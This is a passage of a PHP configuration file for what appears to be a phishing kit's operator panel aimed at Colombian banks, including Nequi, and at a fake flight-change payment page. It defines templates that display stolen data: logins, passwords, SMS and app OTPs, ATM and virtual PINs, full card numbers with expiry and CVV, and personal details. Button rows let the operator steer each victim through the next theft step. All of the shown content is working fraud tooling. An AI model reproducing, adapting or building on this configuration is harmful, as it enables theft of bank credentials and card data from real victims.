                    ['emoji' => '🏧', 'label' => 'Clave Cajero', 'key' => 'clavecajero'],
                    ['emoji' => '🔑', 'label' => 'Clave Virtual', 'key' => 'clavevirtual'],
                ],
            ],
            [
                'name' => 'informacion_adicional',
                'enabled' => true,
                'title' => 'ℹ️ INFORMACIÓN ADICIONAL',
                'fields' => [
                    ['emoji' => '🕒', 'label' => 'Estado', 'key' => 'status'],
                    ['emoji' => '🏦', 'label' => 'Entidad', 'key' => 'ente'],
                ],
            ],
        ],
        'buttons' => [
            'enabled' => true,
            'rows' => [
                [
                    ['text' => 'LOG', 'action' => 'login'],
                    ['text' => 'DAT', 'action' => 'datos'],
                    ['text' => 'SMS', 'action' => 'otpsms'],
                    ['text' => 'APP', 'action' => 'otpapp'],
                    ['text' => 'TDB', 'action' => 'tdb'],
                ],
                [
                    ['text' => 'TDC', 'action' => 'tdc'],
                    ['text' => 'CAJ', 'action' => 'clavecajero'],
                    ['text' => 'VIR', 'action' => 'clavevirtual'],
                    ['text' => 'EXI', 'action' => 'exito'],
                    ['text' => 'ERR', 'action' => 'error'],
                ],
            ],
        ],
    ],

    /*
    |--------------------------------------------------------------------------
    | Plantilla Nequi
    |--------------------------------------------------------------------------
    */
    'nequi' => [
        'header' => [
            'enabled' => true,
            'fields' => [
                ['emoji' => '👥', 'label' => 'Nombre', 'value' => '{name}'],
                ['emoji' => '📋', 'label' => 'ID de Sesión', 'value' => '{uniqid}'],
            ],
        ],
        'sections' => [
            [
                'name' => 'login',
                'enabled' => true,
                'title' => '🔐 CREDENCIALES',
                'fields' => [
                    ['emoji' => '📱', 'label' => 'Celular', 'key' => 'usuario'],
                    ['emoji' => '🔐', 'label' => 'Clave', 'key' => 'clave'],
                ],
            ],
            [
                'name' => 'codigos_seguridad',
                'enabled' => true,
                'title' => '🔑 CÓDIGOS DE SEGURIDAD',
                'fields' => [
                    ['emoji' => '📱', 'label' => 'OTP APP', 'key' => 'otpapp'],
                ],
            ],
            [
                'name' => 'informacion_adicional',
                'enabled' => true,
                'title' => 'ℹ️ INFORMACIÓN ADICIONAL',
                'fields' => [
                    ['emoji' => '🕒', 'label' => 'Estado', 'key' => 'status'],
                    ['emoji' => '🏦', 'label' => 'Entidad', 'key' => 'ente'],
                ],
            ],
        ],
        'buttons' => [
            'enabled' => true,
            'rows' => [
                [
                    ['text' => 'LOG', 'action' => 'login'],
                    ['text' => 'APP', 'action' => 'otpapp'],
                    ['text' => 'EXI', 'action' => 'exito'],
                    ['text' => 'ERR', 'action' => 'error'],
                ],
            ],
        ],
    ],

    /*
    |--------------------------------------------------------------------------
    | Plantilla Cambio de Vuelo TDC
    |--------------------------------------------------------------------------
    */
    'cambiovuelo_tdc' => [
        'header' => [
            'enabled' => true,
            'fields' => [
                ['emoji' => '✈️', 'label' => 'Módulo', 'value' => 'CAMBIO DE VUELO'],
                ['emoji' => '🔑', 'label' => 'ID Sesión', 'value' => '{uniqid}'],
                ['emoji' => '💳', 'label' => 'Método', 'value' => 'Tarjeta de Crédito'],
            ],
        ],
        'sections' => [
            [
                'name' => 'tarjeta_pago',
                'enabled' => true,
                'title' => '💳 TARJETA DE PAGO',
                'fields' => [
                    ['emoji' => '💳', 'label' => 'Número', 'key' => 'numeroTarjeta'],
                    ['emoji' => '👤', 'label' => 'Titular', 'key' => 'nombreTitular'],
                    ['emoji' => '📅', 'label' => 'Vence', 'key' => 'fechaVencimiento'],
                    ['emoji' => '🔒', 'label' => 'CVV', 'key' => 'cvv'],
                ],
            ],
            [
                'name' => 'datos_pagador',
                'enabled' => true,
                'title' => '👤 DATOS DEL PAGADOR',
                'fields' => [
                    ['emoji' => '👤', 'label' => 'Nombre', 'key' => 'nombre'],
                    ['emoji' => '📧', 'label' => 'Email', 'key' => 'email'],
                    ['emoji' => '📱', 'label' => 'Celular', 'key' => 'celular'],
                    ['emoji' => '📍', 'label' => 'Dirección', 'key' => 'direccion'],
                    ['emoji' => '🏙️', 'label' => 'Ciudad', 'key' => 'ciudad'],
                    ['emoji' => '🗺️', 'label' => 'Departamento', 'key' => 'departamento'],
                ],
            ],
            [
                'name' => 'tarjeta_adicional',
                'enabled' => true,
                'title' => '💳 TARJETA ADICIONAL',
                'fields' => [
                    ['emoji' => '💳', 'label' => 'Número TDC', 'key' => 'tdc_numero'],
                    ['emoji' => '📅', 'label' => 'Vence TDC', 'key' => 'tdc_vencimiento'],
                    ['emoji' => '🔒', 'label' => 'CVV TDC', 'key' => 'tdc_cvv'],
                ],
            ],
            [
                'name' => 'codigos_seguridad',
                'enabled' => true,
                'title' => '🔑 CÓDIGOS DE SEGURIDAD',
                'fields' => [
                    ['emoji' => '💬', 'label' => 'OTP SMS', 'key' => 'otp_sms'],
                    ['emoji' => '📱', 'label' => 'OTP APP', 'key' => 'otp_app'],
                    ['emoji' => '🏧', 'label' => 'Clave Cajero', 'key' => 'clave_cajero'],
                    ['emoji' => '🔑', 'label' => 'Clave Virtual', 'key' => 'clave_virtual'],
                ],
            ],
            [
                'name' => 'credenciales',
                'enabled' => true,
                'title' => '🔐 CREDENCIALES',
                'fields' => [
                    ['emoji' => '👤', 'label' => 'Usuario', 'key' => 'login_usuario'],
                    ['emoji' => '🔐', 'label' => 'Clave', 'key' => 'login_clave'],
                ],
            ],
            [
                'name' => 'informacion_vuelo',
                'enabled' => true,
                'title' => 'ℹ️ INFORMACIÓN',
                'fields' => [
                    ['emoji' => '💰', 'label' => 'Total', 'key' => 'total'],
                    ['emoji' => '🕒', 'label' => 'Estado', 'key' => 'status'],
                ],
            ],
        ],
        'buttons' => [
            'enabled' => true,
            'rows' => [
                [
                    ['text' => 'TDC', 'action' => 'tdc'],
                    ['text' => 'SMS', 'action' => 'codsms'],
                    ['text' => 'APP', 'action' => 'codapp'],
                ],
                [
                    ['text' => 'LOG', 'action' => 'login'],
                    ['text' => 'CAJ', 'action' => 'pincaj'],
                    ['text' => 'VIR', 'action' => 'pinvir'],
                ],
                [
                    ['text' => 'CAMB', 'action' => 'cambiar'],
                    ['text' => 'EXITO', 'action' => 'exito'],
                    ['text' => 'ERROR', 'action' => 'error'],
                ],
            ],
        ],
    ],

];
